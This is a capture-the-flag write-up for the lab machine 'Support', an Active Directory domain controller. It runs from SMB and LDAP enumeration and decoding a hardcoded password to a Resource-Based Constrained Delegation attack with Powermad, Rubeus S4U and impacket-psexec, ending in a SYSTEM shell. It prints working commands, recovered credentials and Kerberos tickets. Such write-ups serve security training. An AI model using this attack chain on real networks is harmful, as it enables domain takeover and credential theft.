## Box: Support

> damiano gubiani

```bash
export IP=10.10.11.174
```

# Enumerating

> nmap

```bash
# Nmap 7.95 scan initiated Sun Apr 20 16:44:33 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -oN nmap/fst -vv 10.10.11.174
Nmap scan report for 10.10.11.174 (10.10.11.174)
Host is up, received echo-reply ttl 127 (0.033s latency).
Scanned at 2025-04-20 16:44:33 EDT for 55s
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-20 20:44:42Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19493/tcp): CLEAN (Timeout)
|   Check 2 (port 12756/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 30190/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-20T20:44:48
|_  start_date: N/A
|_clock-skew: -2s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 20 16:45:28 2025 -- 1 IP address (1 host up) scanned in 55.30 seconds
```

lets update out variable

```bash
export domain=support.htb
```

we enumerate the shares

```bash
nxc smb $domain -u 'guest' -p '' --shares

SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [*] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share 

```

lets check the support tools share 

```bash
smbclient \\\\$domain\\support-tools                                             
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 951929 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

we unzip the userinfo and decompile the executable

```java
internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```

we reverse the password encryption

```python3
'''
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}
'''

import base64

def get_password(enc_password: str) -> str:
    key = b"armando"
    array = base64.b64decode(enc_password)
    array2 = bytearray(len(array))

    for i in range(len(array)):
        array2[i] = (array[i] ^ key[i % len(key)]) ^ 0xDF

    return array2.decode('latin1')  # 'latin1' is often used for ANSI-compatible decoding


print(get_password('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'))
```

and we got the password

> ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

ok , now we have a password and an account to query the AD with bloodhound

```bash
bloodhound-python -d $domain -ns $IP -u $user -p $password -c all

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 07S
```

after looking around with Apache Studio i found a password for the support user

> support:Ironside47pleasure40Watchful

since support is part of RDP group lets get a remote shell running

```bash
evil-winrm -u support -p Ironside47pleasure40Watchful -i support.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents>
```

after retriving the user flag , we didnt find nothing intresting looking around

lets check the bloodhound schema again


# Privilage escaletion

after reviewing bloodhound group object for support user , i found we have generic control of dc.support.htb

we can exploit it using Resource Based Constrained Delegation

to archive this we can use the Powermad project

> https://github.com/Kevin-Robertson/Powermad

lets create a fake PC and connect it to the domain

```bash
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

than we need to configure the resource based constrain delegation

```bash
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on.

lets get the raw bytes

```bash
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

let's convert these bytes to a Raw Security Descriptor object.

```bash
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which represents the Access Control 
List that specifies the machines that can act on behalf of the DC

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor


ControlFlags           : DiscretionaryAclPresent, SelfRelative
Owner                  : S-1-5-32-544
Group                  :
SystemAcl              :
DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
ResourceManagerControl : 0
BinaryLength           : 80



*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5602
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator

```bash
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Password123
[*] Input username             : FAKE-COMP01$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA97002B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
[*]       des_cbc_md5          : 5B045E854358687C
```

We need to grab the value called rc4_hmac . Next, we can generate Kerberos tickets for the Administrator

```bash
*Evil-WinRM* PS C:\Users\support\Documents> .\rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      MA4bDEZBS0UtQ09NUDAxJA==

[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!

```

lets convert the key

```bash
base64 -d < ticket.kirbi.b64 > ticket.kirbi
```

now we convert it the ticket to ccache

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

now lets pass the hash

```bash
export KRB5CCNAME=./ticket.ccache

impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file mqBzjxcC.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service AHCW on dc.support.htb.....
[*] Starting service AHCW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

